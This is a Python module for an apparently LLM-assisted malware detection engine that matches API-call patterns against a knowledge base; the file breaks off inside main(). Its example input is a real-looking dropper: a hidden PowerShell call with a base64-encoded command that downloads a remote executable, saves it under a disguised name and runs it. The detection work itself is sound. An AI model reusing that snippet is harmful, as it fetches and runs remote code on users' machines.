"""
RAG Query Engine for Malware Detection
Performs malware detection using pre-built RAG knowledge base with exact pattern matching
"""

import json
import os
import pickle
from typing import Dict, List, Any, Tuple, Optional
import numpy as np
import logging
import sys
from pathlib import Path

try:
    import faiss
except ImportError:
    faiss = None

PYGUARD_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, PYGUARD_ROOT)

from Core.RAG.rag_knowledge_builder import PatternKnowledge, CaseKnowledge, PromptManager
from Utils.llmquery import LLMAgent


class QueryConfig:
    """Configuration for RAG Query Engine."""
    KB_DIR = os.path.join(PYGUARD_ROOT, "Core", "RAG", "rag_knowledge_base")
    PROMPTS_DIR = os.path.join(PYGUARD_ROOT, "Resources", "Prompts", "rag_prompts")

    EXAMPLE_CODE = """import subprocess
import os
try:
    if not os.path.exists('tahg'):
        subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass"""

    EXAMPLE_API_SEQUENCE = [
        "check_path_exists",
        "spawn_process_no_window"
    ]


class RAGQueryEngine:
    def __init__(self, knowledge_base_dir: str = None, llm_agent=None):
        self.knowledge_base_dir = knowledge_base_dir or QueryConfig.KB_DIR
        self.llm_agent = llm_agent or LLMAgent()
        self.prompt_manager = PromptManager(QueryConfig.PROMPTS_DIR)
        self.pattern_knowledge: Dict[int, PatternKnowledge] = {}
        self.case_knowledge: Dict[int, CaseKnowledge] = {}
        self.pattern_to_cases: Dict[int, Dict[str, List[int]]] = {}
        self.pattern_to_pattern_ids: Dict[Tuple[str, ...], List[int]] = {}
        self.pattern_index = None
        self.case_index = None
        self.pattern_embeddings = {}
        self.case_embeddings = {}
        self.use_llm_embeddings = True
        self.embedding_dimension = 3072
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        self._load_knowledge_base()


    def _get_embedding(self, text: str) -> np.ndarray:
        try:
            return self.llm_agent.generate_embedding(text)
        except Exception as e:
            self.logger.error(f"Failed to get embedding for text: {e}")
            return np.zeros(self.embedding_dimension, dtype=np.float32)


    def _load_knowledge_base(self):
        if not os.path.exists(self.knowledge_base_dir):
            raise FileNotFoundError(f"Knowledge base directory not found: {self.knowledge_base_dir}")
        self.logger.info(f"Loading knowledge base from {self.knowledge_base_dir}")
        try:
            metadata_path = os.path.join(self.knowledge_base_dir, 'metadata.json')
            if os.path.exists(metadata_path):
                with open(metadata_path, 'r') as f:
                    metadata = json.load(f)
            with open(os.path.join(self.knowledge_base_dir, 'pattern_knowledge.pkl'), 'rb') as f:
                self.pattern_knowledge = pickle.load(f)
            with open(os.path.join(self.knowledge_base_dir, 'case_knowledge.pkl'), 'rb') as f:
                self.case_knowledge = pickle.load(f)
            with open(os.path.join(self.knowledge_base_dir, 'embeddings_and_mappings.pkl'), 'rb') as f:
                data = pickle.load(f)
                self.pattern_to_cases = data['pattern_to_cases']
                self.pattern_to_pattern_ids = data.get('pattern_to_pattern_ids', {})
                self.pattern_embeddings = data.get('pattern_embeddings', {})
                self.case_embeddings = data.get('case_embeddings', {})
            if faiss is not None:
                pattern_index_path = os.path.join(self.knowledge_base_dir, 'pattern_index.faiss')
                if os.path.exists(pattern_index_path):
                    self.pattern_index = faiss.read_index(pattern_index_path)
                case_index_path = os.path.join(self.knowledge_base_dir, 'case_index.faiss')
                if os.path.exists(case_index_path):
                    self.case_index = faiss.read_index(case_index_path)
            self.logger.info(f"Successfully loaded knowledge base: {len(self.pattern_knowledge)} patterns, {len(self.case_knowledge)} cases")
            self.logger.info(f"Pattern subsequences mapping: {len(self.pattern_to_pattern_ids)} unique subsequences")
        except Exception as e:
            raise RuntimeError(f"Failed to load knowledge base: {e}")


    def find_matching_patterns(self, input_sequence: List[str]) -> List[Tuple[int, int, str]]:
        matching_patterns = []
        input_tuple = tuple(input_sequence)
        self.logger.info(f"Searching for patterns matching input sequence: {input_sequence}")
        for pattern_subsequence, pattern_ids in self.pattern_to_pattern_ids.items():
            match_type = None
            match_length = 0
            if pattern_subsequence == input_tuple:
                match_type = 'exact'
                match_length = len(pattern_subsequence)
            elif self._is_subsequence(input_tuple, pattern_subsequence):
                match_type = 'contains_input'
                match_length = len(input_tuple)
            elif self._is_subsequence(pattern_subsequence, input_tuple):
                match_type = 'contained_by_input'
                match_length = len(pattern_subsequence)
            if match_type:
                for pattern_id in pattern_ids:
                    matching_patterns.append((pattern_id, match_length, match_type))
                    self.logger.debug(f"Found match: Pattern {pattern_id}, length {match_length}, type {match_type}")
        match_type_priority = {'exact': 3, 'contains_input': 2, 'contained_by_input': 1}
        matching_patterns.sort(key=lambda x: (x[1], match_type_priority[x[2]]), reverse=True)
        self.logger.info(f"Found {len(matching_patterns)} matching patterns")
        return matching_patterns


    def _is_subsequence(self, subseq: Tuple, seq: Tuple) -> bool:
        if len(subseq) > len(seq):
            return False
        subseq_idx = 0
        for item in seq:
            if subseq_idx < len(subseq) and item == subseq[subseq_idx]:
                subseq_idx += 1
        return subseq_idx == len(subseq)


    def get_best_matching_pattern(self, input_sequence: List[str]) -> Optional[Tuple[int, int, str]]:
        """
        Get the best matching pattern for input sequence (longest and most specific match)

        Args:
            input_sequence: Input API call sequence to analyze

        Returns:
            (pattern_id, match_length, match_type) tuple for best match, or None if no match
        """
        matching_patterns = self.find_matching_patterns(input_sequence)
        if matching_patterns:
            best_match = matching_patterns[0]
            pattern_id, match_length, match_type = best_match
            self.logger.info(f"Best matching pattern: {pattern_id} (length: {match_length}, type: {match_type})")
            return best_match
        self.logger.warning("No matching patterns found")
        return None


    def multi_level_case_retrieval(self, input_sequence: List[str], input_context: str, pattern_id: int, top_k: int = 5) -> List[Tuple[int, float, str]]:
        """
        Multi-level case retrieval using pre-computed embeddings for efficiency

        Args:
            input_sequence: Input Action sequence to analyze
            input_context: Input code context
            pattern_id: Pattern ID to search within
            top_k: Number of top similar cases to return

        Returns:
            List of (case_id, similarity_score, similarity_type) tuples
        """
        if pattern_id not in self.pattern_to_cases:
            return []
        all_case_ids = self.pattern_to_cases[pattern_id]["benign"] + self.pattern_to_cases[pattern_id]["malware"]
        if not all_case_ids:
            return []
        self.logger.info(f"Performing multi-level similarity search within pattern {pattern_id} across {len(all_case_ids)} cases")
        input_seq_key = ' '.join(input_sequence)
        if input_seq_key in self.case_embeddings:
            input_sequence_embedding = self.case_embeddings[input_seq_key]
        else:
            input_sequence_embedding = self._get_embedding(input_seq_key)
            self.case_embeddings[input_seq_key] = input_sequence_embedding
        input_context_embedding = self._get_embedding(input_context)
        combined_similarities = {}
        sequence_weight = 0.4
        context_weight = 0.6
        for case_id in all_case_ids:
            if case_id in self.case_knowledge:
                case = self.case_knowledge[case_id]
                if hasattr(case, 'similarity_embedding') and case.similarity_embedding is not None:
                    case_context_embedding = case.similarity_embedding
                    case_context_embedding = case_context_embedding / np.linalg.norm(case_context_embedding)
                    ctx_similarity = np.dot(input_context_embedding, case_context_embedding)
                else:
                    case_context_embedding = self._get_embedding(case.code_context)
                    ctx_similarity = np.dot(input_context_embedding, case_context_embedding)
                if hasattr(case, 'action_sequence_embedding') and case.action_sequence_embedding is not None:
                    case_sequence_embedding = case.action_sequence_embedding
                    case_sequence_embedding = case_sequence_embedding / np.linalg.norm(case_sequence_embedding)
                    seq_similarity = np.dot(input_sequence_embedding, case_sequence_embedding)
                else:
                    case_sequence = [api.get('id', '') for api in case.case_action_sequence if api.get('id')]
                    if case_sequence:
                        case_seq_key = ' '.join(case_sequence)
                        if case_seq_key in self.case_embeddings:
                            case_sequence_embedding = self.case_embeddings[case_seq_key]
                        else:
                            case_sequence_embedding = self._get_embedding(case_seq_key)
                            self.case_embeddings[case_seq_key] = case_sequence_embedding
                        seq_similarity = np.dot(input_sequence_embedding, case_sequence_embedding)
                    else:
                        seq_similarity = 0.0
                combined_similarity = seq_similarity * sequence_weight + ctx_similarity * context_weight
                combined_similarities[case_id] = combined_similarity
        sorted_cases = sorted(combined_similarities.items(), key=lambda x: x[1], reverse=True)
        result = []
        for case_id, combined_sim in sorted_cases[:top_k]:
            result.append((case_id, combined_sim, 'combined'))
        self.logger.info(f"Found {len(result)} similar cases using multi-level similarity")
        return result


    def efficient_case_retrieval(self, input_sequence: List[str], input_context: str, pattern_id: int, top_k: int = 5) -> List[Tuple[int, float, str]]:
        if pattern_id not in self.pattern_to_cases:
            return []
        all_case_ids = self.pattern_to_cases[pattern_id]["benign"] + self.pattern_to_cases[pattern_id]["malware"]
        if not all_case_ids or not self.case_index:
            return []
        self.logger.info(f"Performing efficient similarity search within pattern {pattern_id} across {len(all_case_ids)} cases")
        input_context_embedding = self._get_embedding(input_context)
        query_embedding = input_context_embedding.reshape(1, -1).astype('float32')
        scores, indices = self.case_index.search(query_embedding, len(self.case_knowledge))
        case_ids_list = list(self.case_knowledge.keys())
        filtered_results = []
        for score, idx in zip(scores[0], indices[0]):
            if idx < len(case_ids_list):
                case_id = case_ids_list[idx]
                if case_id in all_case_ids:
                    filtered_results.append((case_id, float(score), 'context'))
                    if len(filtered_results) >= top_k:
                        break
        self.logger.info(f"Found {len(filtered_results)} similar cases using efficient FAISS search")
        return filtered_results


    def comprehensive_rag_retrieval(self, input_sequence: List[str], input_context: str) -> Dict:
        self.logger.info("Starting comprehensive RAG retrieval...")
        retrieval_result = {
            "pattern_match": None,
            "similar_cases": [],
            "pattern_knowledge": None,
            "case_analysis": {
                "benign_cases": [],
                "malware_cases": []
            }
        }
        best_pattern_match = self.get_best_matching_pattern(input_sequence)
        if not best_pattern_match:
            self.logger.warning("No pattern match found")
            return retrieval_result
        pattern_id, match_length, match_type = best_pattern_match
        pattern_knowledge = self.pattern_knowledge.get(pattern_id)
        if not pattern_knowledge:
            self.logger.warning(f"Pattern knowledge not found for ID {pattern_id}")
            return retrieval_result
        retrieval_result["pattern_match"] = {
            "pattern_id": pattern_id,
            "match_length": match_length,
            "match_type": match_type,
            "pattern_sequence": pattern_knowledge.pattern,
            "pattern_type": pattern_knowledge.pattern_type
        }
        retrieval_result["pattern_knowledge"] = pattern_knowledge
        self.logger.info(f"Best pattern match: {pattern_id} (type: {pattern_knowledge.pattern_type}, match: {match_length}/{len(input_sequence)})")
        similar_cases = self.efficient_case_retrieval(input_sequence, input_context, pattern_id, top_k=10)
        for case_id, similarity, sim_type in similar_cases:
            case_knowledge = self.case_knowledge.get(case_id)
            if case_knowledge:
                case_info = {
                    "case_id": case_id,
                    "similarity": similarity,
                    "filename": case_knowledge.filename,
                    "label": case_knowledge.label,
                    "case_summary": case_knowledge.case_summary,
                    "key_behaviors": case_knowledge.key_behaviors,
                    "risk_indicators": case_knowledge.risk_indicators,
                    "code_context": case_knowledge.code_context,
                    "api_sequence": [api.get('id', '') for api in case_knowledge.case_action_sequence if api.get('id')]
                }
                if case_knowledge.label == "benign":
                    retrieval_result["case_analysis"]["benign_cases"].append(case_info)
                else:
                    retrieval_result["case_analysis"]["malware_cases"].append(case_info)
        retrieval_result["similar_cases"] = similar_cases
        self.logger.info(f"Retrieved {len(retrieval_result['case_analysis']['benign_cases'])} benign and {len(retrieval_result['case_analysis']['malware_cases'])} malware cases")
        return retrieval_result


    def build_enhanced_analysis_prompt(self, target_code: str, target_action_sequence: List[str], rag_retrieval: Dict) -> str:
        if not rag_retrieval["pattern_match"]:
            return self.prompt_manager.format_template(
                'basic_detection',
                TARGET_CODE=target_code,
                TARGET_ACTION_SEQUENCE=' -> '.join(target_action_sequence)
            )
        pattern_match = rag_retrieval["pattern_match"]
        pattern_knowledge = rag_retrieval["pattern_knowledge"]
        benign_cases = rag_retrieval["case_analysis"]["benign_cases"][:3]
        malware_cases = rag_retrieval["case_analysis"]["malware_cases"][:3]
        pattern_specific_knowledge = self._build_pattern_specific_knowledge(pattern_knowledge)
        benign_cases_section = self._build_similar_cases_section(benign_cases, "BENIGN")
        malware_cases_section = self._build_similar_cases_section(malware_cases, "MALWARE")
        prompt = self.prompt_manager.format_template(
            'malware_detection',
            TARGET_CODE=target_code,
            TARGET_ACTION_SEQUENCE=' -> '.join(target_action_sequence),
            SIMILARITY=f"Pattern match: {pattern_match['match_length']}/{len(target_action_sequence)} actions ({pattern_match['match_type']})",
            PATTERN=' -> '.join(pattern_knowledge.pattern),
            PATTERN_TYPE=pattern_knowledge.pattern_type,
            SEMANTIC_SUMMARY=pattern_knowledge.semantic_summary,
            SECURITY_ASSESSMENT=pattern_knowledge.security_assessment,
            PATTERN_SPECIFIC_KNOWLEDGE=pattern_specific_knowledge,
            BENIGN_CASES_SECTION=benign_cases_section,
            MALWARE_CASES_SECTION=malware_cases_section
        )
        return prompt


    def _build_similar_cases_section(self, cases: List[Dict], case_type: str) -> str:
        if not cases:
            return f"**{case_type} SIMILAR CASES:**\nNo similar {case_type.lower()} cases found.\n"
        section = f"**{case_type} SIMILAR CASES (Most Similar):**\n"
        for i, case in enumerate(cases):
            section += f"""
                {case_type.title()} Case {i+1} (Similarity: {case['similarity']:.3f}):
                File: {case['filename']}
                Summary: {case['case_summary']}
                Key Behaviors: {', '.join(case['key_behaviors']) if case['key_behaviors'] else 'Not analyzed'}
                """
            if case_type == "MALWARE" and case['risk_indicators']:
                section += f"Risk Indicators: {', '.join(case['risk_indicators'])}\n"
            api_sequence = case['api_sequence'] if isinstance(case['api_sequence'], list) and isinstance(case['api_sequence'][0], str) else [api.get('id', '') for api in case['api_sequence']]
            section += f"API Sequence: {' -> '.join(api_sequence)}\n"
            code_preview = case['code_context'][:250] + "..." if len(case['code_context']) > 250 else case['code_context']
            section += f"Code Context:\n```python\n{code_preview}\n```\n"
        return section


    def detect_malware(self, target_code: str, target_action_sequence: List[str]) -> Dict:
        self.logger.info(f"Starting comprehensive malware detection for Action sequence: {target_action_sequence}")
        rag_retrieval = self.comprehensive_rag_retrieval(target_action_sequence, target_code)
        analysis_prompt = self.build_enhanced_analysis_prompt(target_code, target_action_sequence, rag_retrieval)
        try:
            response = self.llm_agent.perform_query(
                messages=[
                    {
                        "role": "system",
                        "content": "You are an expert malware detection system. Use the provided knowledge base of patterns and similar cases to make accurate security assessments. Pay special attention to the similarity scores and pattern matching information. Always respond in English with structured JSON output."
                    },
                    {
                        "role": "user",
                        "content": analysis_prompt
                    }
                ],
                response_format={"type": "json_object"}
            )
            detection_result = json.loads(response)
            if rag_retrieval["pattern_match"]:
                pattern_match = rag_retrieval["pattern_match"]
                detection_result["rag_retrieval_info"] = {
                    "matched_pattern_id": pattern_match["pattern_id"],
                    "pattern_match_length": pattern_match["match_length"],
                    "pattern_match_type": pattern_match["match_type"],
                    "pattern_type": pattern_match["pattern_type"],
                    "matched_pattern_sequence": pattern_match["pattern_sequence"],
                    "input_sequence_length": len(target_action_sequence),
                    "similar_benign_cases": len(rag_retrieval["case_analysis"]["benign_cases"]),
                    "similar_malware_cases": len(rag_retrieval["case_analysis"]["malware_cases"]),
                    "total_similar_cases": len(rag_retrieval["similar_cases"]),
                    "retrieval_method": "multi_level_embedding_similarity"
                }
                if rag_retrieval["similar_cases"]:
                    top_cases = rag_retrieval["similar_cases"][:3]
                    detection_result["rag_retrieval_info"]["top_similar_cases"] = [
                        {
                            "case_id": case_id,
                            "similarity": similarity,
                            "label": self.case_knowledge[case_id].label if case_id in self.case_knowledge else "unknown"
                        }
                        for case_id, similarity, _ in top_cases
                    ]
            else:
                detection_result["rag_retrieval_info"] = {
                    "matched_pattern_id": None,
                    "pattern_match_type": "no_match",
                    "retrieval_method": "basic_analysis"
                }
            detection_result["knowledge_base_info"] = {
                "total_patterns_in_kb": len(self.pattern_knowledge),
                "total_cases_in_kb": len(self.case_knowledge),
                "embedding_model": "text-embedding-3-large"
            }
            self.logger.info(f"Detection completed with risk level: {detection_result.get('risk_level', 'unknown')}")
            return detection_result
        except Exception as e:
            self.logger.error(f"Detection failed: {e}")
            return {
                "risk_level": "unknown",
                "confidence": 0.0,
                "reasoning": f"Analysis failed due to error: {e}",
                "error": True,
                "rag_retrieval_info": {"error": str(e)},
                "knowledge_base_info": {
                    "total_patterns_in_kb": len(self.pattern_knowledge),
                    "total_cases_in_kb": len(self.case_knowledge)
                }
            }


    def _build_pattern_specific_knowledge(self, pattern_knowledge: PatternKnowledge) -> str:
        if pattern_knowledge.pattern_type in ['distinction_benign_biased', 'distinction_malware_biased']:
            return f"""
                **DISTINCTION PATTERN ANALYSIS:**
                This pattern appears in both benign and malicious contexts. Key distinguishing factors:

                **Benign Characteristics:**
                {chr(10).join(f"- {char}" for char in pattern_knowledge.benign_characteristics)}

                **Malware Characteristics:**
                {chr(10).join(f"- {char}" for char in pattern_knowledge.malware_characteristics)}

                **Distinction Rules:**
                {chr(10).join(f"- {rule}" for rule in pattern_knowledge.distinction_rules)}

                **Context Indicators:**
                {json.dumps(pattern_knowledge.context_indicators, indent=2)}
                """
        elif pattern_knowledge.pattern_type == 'pure_benign_only':
            return f"""
                **PURE BENIGN PATTERN:**
                This pattern is consistently benign across all known cases.

                **Benign Characteristics:**
                {chr(10).join(f"- {char}" for char in pattern_knowledge.benign_characteristics)}

                **Typical Scenarios:**
                {chr(10).join(f"- {scenario}" for scenario in pattern_knowledge.typical_scenarios)}
                """
        elif pattern_knowledge.pattern_type == 'pure_malware_only':
            return f"""
                **PURE MALWARE PATTERN:**
                This pattern is consistently malicious across all known cases.

                **Malware Characteristics:**
                {chr(10).join(f"- {char}" for char in pattern_knowledge.malware_characteristics)}

                **Risk Indicators:**
                {chr(10).join(f"- {scenario}" for scenario in pattern_knowledge.typical_scenarios)}
                """
        else:
            return f"**Pattern Type:** {pattern_knowledge.pattern_type}"


    def _build_cases_section(self, cases: List[CaseKnowledge], case_type: str) -> str:
        if not cases:
            return f"**{case_type} CASE EXAMPLES:**\nNo {case_type.lower()} cases available for this pattern.\n"
        section = f"**{case_type} CASE EXAMPLES:**\n"
        for i, case in enumerate(cases):
            section += f"""
                {case_type.title()} Case {i+1}:
                File: {case.filename}
                Summary: {case.case_summary}
                Key Behaviors: {', '.join(case.key_behaviors) if case.key_behaviors else 'Not analyzed'}
                """
            if case_type == "MALWARE" and case.risk_indicators:
                section += f"Risk Indicators: {', '.join(case.risk_indicators)}\n"
            code_preview = case.code_context[:300] + "..." if len(case.code_context) > 300 else case.code_context
            section += f"Code Context:\n```python\n{code_preview}\n```\n"
        return section


    def explain_detection_process(self, target_code: str, target_action_sequence: List[str]) -> Dict:
        explanation = {
            "input_analysis": {
                "code_length": len(target_code),
                "api_count": len(target_action_sequence),
                "api_sequence": target_action_sequence
            },
            "step1_pattern_matching": {},
            "step2_sequence_similarity": {},
            "step3_context_similarity": {},
            "step4_knowledge_integration": {}
        }
        rag_retrieval = self.comprehensive_rag_retrieval(target_action_sequence, target_code)
        if rag_retrieval["pattern_match"]:
            pattern_match = rag_retrieval["pattern_match"]
            explanation["step1_pattern_matching"] = {
                "status": "match_found",
                "matched_pattern_id": pattern_match["pattern_id"],
                "pattern_sequence": pattern_match["pattern_sequence"],
                "match_length": pattern_match["match_length"],
                "match_type": pattern_match["match_type"],
                "pattern_type": pattern_match["pattern_type"],
                "explanation": f"Found pattern {pattern_match['pattern_id']} with {pattern_match['match_length']} matching actions ({pattern_match['match_type']})"
            }
        else:
            explanation["step1_pattern_matching"] = {
                "status": "no_match",
                "explanation": "No pattern subsequences found that match the input Action sequence"
            }
        if rag_retrieval["pattern_match"]:
            similar_cases = rag_retrieval["similar_cases"]
            explanation["step2_sequence_similarity"] = {
                "method": "action_sequence_embedding_cosine_similarity",
                "cases_analyzed": len(self.pattern_to_cases[rag_retrieval["pattern_match"]["pattern_id"]]["benign"]) +
                                len(self.pattern_to_cases[rag_retrieval["pattern_match"]["pattern_id"]]["malware"]),
                "top_sequence_matches": []
            }
            explanation["step3_context_similarity"] = {
                "method": "code_context_embedding_cosine_similarity",
                "combined_weighting": "sequence: 40%, context: 60%",
                "top_combined_matches": []
            }
            for case_id, similarity, sim_type in similar_cases[:5]:
                if case_id in self.case_knowledge:
                    case = self.case_knowledge[case_id]
                    case_action_sequence = [api.get('id', '') for api in case.case_action_sequence]
                    match_info = {
                        "case_id": case_id,
                        "similarity_score": similarity,
                        "label": case.label,
                        "filename": case.filename,
                        "case_action_sequence": case_action_sequence
                    }
                    explanation["step3_context_similarity"]["top_combined_matches"].append(match_info)
        explanation["step4_knowledge_integration"] = {
            "pattern_knowledge_used": rag_retrieval["pattern_knowledge"] is not None,
            "benign_cases_retrieved": len(rag_retrieval["case_analysis"]["benign_cases"]),
            "malware_cases_retrieved": len(rag_retrieval["case_analysis"]["malware_cases"]),
            "total_knowledge_elements": []
        }
        if rag_retrieval["pattern_knowledge"]:
            pk = rag_retrieval["pattern_knowledge"]
            explanation["step4_knowledge_integration"]["total_knowledge_elements"] = [
                f"Pattern semantic summary: {pk.semantic_summary[:100]}...",
                f"Security assessment: {pk.security_assessment[:100]}...",
                f"Benign characteristics: {len(pk.benign_characteristics)} items",
                f"Malware characteristics: {len(pk.malware_characteristics)} items",
                f"Distinction rules: {len(pk.distinction_rules)} rules"
            ]
        return explanation


    def query_with_context(self, action_sequence: List[str], code_context: str, additional_context: Dict = None) -> Dict:
        self.logger.info(f"Starting dual similarity matching for Action sequence: {action_sequence}")
        result = {
            "api_sequence": action_sequence,
            "code_context": code_context,
            "top_patterns": [],
            "top_similar_cases": [],
            "explanation": "",
            "is_malicious": False,
            "matched_patterns": [],
            "similar_cases": []
        }
        try:
            action_sequence_text = ' '.join(action_sequence)
            if action_sequence_text in self.case_embeddings:
                action_embedding = self.case_embeddings[action_sequence_text]
            else:
                action_embedding = self._get_embedding(action_sequence_text)
                self.case_embeddings[action_sequence_text] = action_embedding
            pattern_similarities = []
            for pattern_id, pattern_knowledge in self.pattern_knowledge.items():
                if hasattr(pattern_knowledge, 'pattern_embedding') and pattern_knowledge.pattern_embedding is not None:
                    pattern_embedding = pattern_knowledge.pattern_embedding
                    pattern_embedding = pattern_embedding / np.linalg.norm(pattern_embedding)
                else:
                    self.logger.warning(f"Pattern {pattern_id} missing precomputed embedding, computing on-the-fly")
                    pattern_text = ' '.join(pattern_knowledge.pattern)
                    pattern_embedding = self._get_embedding(pattern_text)
                similarity = np.dot(action_embedding, pattern_embedding)
                pattern_similarities.append((pattern_id, similarity, pattern_knowledge))
            pattern_similarities.sort(key=lambda x: x[1], reverse=True)
            top_patterns = pattern_similarities[:5]
            self.logger.info(f"Found top {len(top_patterns)} similar patterns")
            code_embedding = self._get_embedding(code_context)
            case_similarities = []
            for case_id, case_knowledge in self.case_knowledge.items():
                if hasattr(case_knowledge, 'similarity_embedding') and case_knowledge.similarity_embedding is not None:
                    case_embedding = case_knowledge.similarity_embedding
                    case_embedding = case_embedding / np.linalg.norm(case_embedding)
                else:
                    case_embedding = self._get_embedding(case_knowledge.code_context)
                similarity = np.dot(code_embedding, case_embedding)
                case_similarities.append((case_id, similarity, case_knowledge))
            case_similarities.sort(key=lambda x: x[1], reverse=True)
            top_cases = case_similarities[:5]
            self.logger.info(f"Found top {len(top_cases)} similar code contexts")
            result["top_patterns"] = []
            for pattern_id, similarity, pattern_knowledge in top_patterns:
                pattern_info = {
                    "pattern_id": pattern_id,
                    "similarity": float(similarity),
                    "pattern_sequence": pattern_knowledge.pattern,
                    "pattern_type": pattern_knowledge.pattern_type,
                    "semantic_summary": pattern_knowledge.semantic_summary,
                    "security_assessment": pattern_knowledge.security_assessment,
                    "malware_characteristics": pattern_knowledge.malware_characteristics,
                    "benign_characteristics": pattern_knowledge.benign_characteristics,
                    "distinction_rules": pattern_knowledge.distinction_rules
                }
                result["top_patterns"].append(pattern_info)
                result["matched_patterns"].append(pattern_info)
            result["top_similar_cases"] = []
            for case_id, similarity, case_knowledge in top_cases:
                case_info = {
                    "case_id": case_id,
                    "similarity": float(similarity),
                    "filename": case_knowledge.filename,
                    "label": case_knowledge.label,
                    "case_summary": case_knowledge.case_summary,
                    "key_behaviors": case_knowledge.key_behaviors,
                    "risk_indicators": case_knowledge.risk_indicators,
                    "code_context": case_knowledge.code_context,
                    "api_sequence": [api.get('id', '') for api in case_knowledge.case_action_sequence if api.get('id')]
                }
                result["top_similar_cases"].append(case_info)
                result["similar_cases"].append(case_info)
            analysis_prompt = self._build_dual_similarity_prompt(
                action_sequence, code_context, result["top_patterns"], result["top_similar_cases"]
            )
            llm_response = self.llm_agent.perform_query(
                messages=[
                    {
                        "role": "system",
                        "content": "You are an expert malware detection system. Analyze the provided code using the top-5 most similar patterns and top-5 most similar code contexts from the knowledge base. Provide a comprehensive risk assessment in JSON format."
                    },
                    {
                        "role": "user",
                        "content": analysis_prompt
                    }
                ],
                response_format={"type": "json_object"}
            )
            llm_result = json.loads(llm_response)
            result.update({
                "explanation": llm_result.get("explanation", ""),
                "is_malicious": llm_result.get("is_malicious", False),
                "llm_reasoning": llm_result.get("reasoning", ""),
                "recommendation": llm_result.get("recommendation", ""),
                "matched_pattern_analysis": llm_result.get("matched_pattern_analysis", ""),
                "code_context_analysis": llm_result.get("code_context_analysis", "")
            })
        except Exception as e:
            self.logger.error(f"Dual similarity analysis failed: {e}")
            result.update({
                "error": str(e),
                "explanation": f"Analysis failed: {e}"
            })
        return result


    def _build_dual_similarity_prompt(self, action_sequence: List[str], code_context: str,
                                     top_patterns: List[Dict], top_cases: List[Dict]) -> str:
        """Build prompt for dual similarity analysis"""
        prompt = f"""# Malware Detection Analysis using Dual Similarity Matching

            ## Target Code Analysis
            **API Sequence:** {' -> '.join(action_sequence)}
            **Code Context:**
            ```python
            {code_context}
            ```

            ## Top-5 Most Similar Patterns (Pattern-Level Similarity)
            """
        for i, pattern in enumerate(top_patterns, 1):
            prompt += f"""
                ### Pattern {i} (Similarity: {pattern['similarity']:.3f})
                - **Pattern ID:** {pattern['pattern_id']}
                - **Pattern Sequence:** {' -> '.join(pattern['pattern_sequence'])}
                - **Pattern Type:** {pattern['pattern_type']}
                - **Semantic Summary:** {pattern['semantic_summary']}
                - **Security Assessment:** {pattern['security_assessment']}
                """
            if pattern['malware_characteristics']:
                prompt += f"- **Malware Characteristics:** {'; '.join(pattern['malware_characteristics'])}\n"
            if pattern['benign_characteristics']:
                prompt += f"- **Benign Characteristics:** {'; '.join(pattern['benign_characteristics'])}\n"
        prompt += "\n## Top-5 Most Similar Code Contexts (Case-Level Similarity)\n"
        for i, case in enumerate(top_cases, 1):
            prompt += f"""
                ### Case {i} (Similarity: {case['similarity']:.3f})
                - **Case ID:** {case['case_id']}
                - **Label:** {case['label']}
                - **Summary:** {case['case_summary']}
                - **Key Behaviors:** {', '.join(case['key_behaviors']) if case['key_behaviors'] else 'None'}
                - **API Sequence:** {' -> '.join(case['api_sequence']) if case['api_sequence'] else 'None'}
                - **Code Context Preview:**
                ```python
                {case['code_context'][:30000]}{'...' if len(case['code_context']) > 30000 else ''}
                ```
                """
            if case['risk_indicators']:
                prompt += f"- **Risk Indicators:** {', '.join(case['risk_indicators'])}\n"
        prompt += """
            ## Analysis Task
            Based on the target code and the top-5 similar patterns and top-5 similar code contexts:

            1. Analyze the target code's behavior and intent
            2. Compare with similar patterns to identify potential security concerns
            3. Compare with similar code contexts to understand implementation details
            4. Provide a comprehensive risk assessment

            ## Required JSON Response Format
            ```json
            {
                "is_malicious": true|false,
                "explanation": "Detailed explanation of the risk assessment",
                "reasoning": "Step-by-step reasoning process",
                "recommendation": "Recommended action sequence (only one)",
                "matched_pattern_analysis": "Analysis of how target matches with similar patterns",
                "code_context_analysis": "Analysis of how target compares with similar code contexts"
            }
            ```
            """
        return prompt


    def get_knowledge_base_stats(self) -> Dict:
        """Get comprehensive knowledge base statistics"""
        pattern_type_counts = {}
        for pattern in self.pattern_knowledge.values():
            ptype = pattern.pattern_type
            pattern_type_counts[ptype] = pattern_type_counts.get(ptype, 0) + 1
        case_label_counts = {}
        for case in self.case_knowledge.values():
            label = case.label
            case_label_counts[label] = case_label_counts.get(label, 0) + 1
        return {
            "total_patterns": len(self.pattern_knowledge),
            "total_cases": len(self.case_knowledge),
            "total_pattern_subsequences": len(self.pattern_to_pattern_ids),
            "pattern_types": pattern_type_counts,
            "case_labels": case_label_counts,
            "average_cases_per_pattern": len(self.case_knowledge) / len(self.pattern_knowledge) if self.pattern_knowledge else 0
        }


def main():
    """Main function for RAG-based malware detection with predefined examples"""
    print("=== RAG Malware Detection Engine ===")
    print(f"Knowledge base: {QueryConfig.KB_DIR}")
    print(f"Prompts directory: {QueryConfig.PROMPTS_DIR}")
    if not os.path.exists(QueryConfig.KB_DIR):
        print(f"Error: Knowledge base directory {QueryConfig.KB_DIR} does not exist")
        print("Please run the rag_knowledge_builder.py first to create the knowledge base")
        return
    try:
        detector = RAGQueryEngine()
        stats = detector.get_knowledge_base_stats()
        print("\n=== Knowledge Base Statistics ===")
        for key, value in stats.items():
            print(f"{key}: {value}")
        print(f"\n=== Analyzing Example Code ===")
